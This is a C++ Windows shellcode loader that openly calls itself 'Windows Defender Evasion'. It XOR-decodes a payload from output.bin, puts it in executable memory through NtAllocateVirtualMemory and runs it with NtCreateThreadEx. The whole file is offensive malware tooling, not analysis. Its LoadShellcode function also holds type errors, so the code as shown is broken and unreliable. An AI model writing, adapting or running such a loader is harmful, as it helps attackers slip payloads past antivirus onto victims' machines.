#include <windows.h>
#include <winternl.h>
#include <iostream>
#include <fstream>

#pragma comment(lib, "ntdll.lib")

#define XOR_KEY 0x42
#define THREAD_ALL_ACCESS 0x1FFFFF

typedef NTSTATUS(NTAPI* _NtAllocateVirtualMemory)(
HANDLE ProcessHandle,
PVOID* BaseAddress,
ULONG ZeroBits,
PSIZE_T RegionSize,
ULONG AllocationType,
ULONG Protect
);

typedef NTSTATUS(NTAPI* _NtCreateThreadEx)(
PHANDLE ThreadHandle,
ACCESS_MASK DesiredAccess,
PVOID ObjectAttributes,
HANDLE ProcessHandle,
PVOID StartRoutine,
PVOID Argument,
ULONG CreateFlags,
SIZE_T ZeroBits,
SIZE_T StackSize,
SIZE_T MaximumStackSize,
PVOID AttributeList
);

void XORDecrypt(char* buffer, SIZE_T size, char key) {
for (SIZE_T i = 0; i < size; ++i) {
buffer[i] ^= key;
}
}

char* LoadShellcode(const char* filename, SIZE_T* size) {
std::ifstream file(filename, std::ios::binary | std::ios::ate);
if (!file) return nullptr;
size = file.tellg();
char buffer = new char[*size];
file.seekg(0, std::ios::beg);
file.read(buffer, *size);
file.close();
return buffer;
}

int main() {
SIZE_T shellcodeSize = 0;
char* shellcode = LoadShellcode("output.bin", &shellcodeSize);
if (!shellcode) {
std::cerr << "[-] Failed to load shellcode\n";
return -1;
}

XORDecrypt(shellcode, shellcodeSize, XOR_KEY);
std::cout << "[*] Shellcode decrypted (" << shellcodeSize << " bytes)\n";

_NtAllocateVirtualMemory NtAllocateVirtualMemory = (_NtAllocateVirtualMemory)
    GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtAllocateVirtualMemory");

_NtCreateThreadEx NtCreateThreadEx = (_NtCreateThreadEx)
    GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtCreateThreadEx");

if (!NtAllocateVirtualMemory || !NtCreateThreadEx) {
    std::cerr << "[-] Failed to resolve NT functions\n";
    delete[] shellcode;
    return -1;
}

PVOID baseAddr = nullptr;
SIZE_T regionSize = shellcodeSize;

NTSTATUS status = NtAllocateVirtualMemory(
    GetCurrentProcess(),
    &baseAddr,
    0,
    &regionSize,
    MEM_COMMIT | MEM_RESERVE,
    PAGE_EXECUTE_READWRITE
);

if (status != 0) {
    std::cerr << "[-] NtAllocateVirtualMemory failed: 0x" << std::hex << status << "\n";
    delete[] shellcode;
    return -1;
}

std::cout << "[+] Memory allocated at: " << baseAddr << "\n";
std::cout << "[+] Windows Defender Evasion by AdminLegend\n";
memcpy(baseAddr, shellcode, shellcodeSize);
delete[] shellcode;

HANDLE hThread = nullptr;
status = NtCreateThreadEx(
    &hThread,
    THREAD_ALL_ACCESS,
    NULL,
    GetCurrentProcess(),
    baseAddr,
    NULL,
    FALSE,
    0,
    0,
    0,
    NULL
);

if (status != 0) {
    std::cerr << "[-] NtCreateThreadEx failed: 0x" << std::hex << status << "\n";
    return -1;
}

std::cout << "[+] Shellcode executed via NtCreateThreadEx\n";

WaitForSingleObject(hThread, INFINITE);
CloseHandle(hThread);
return 0;

}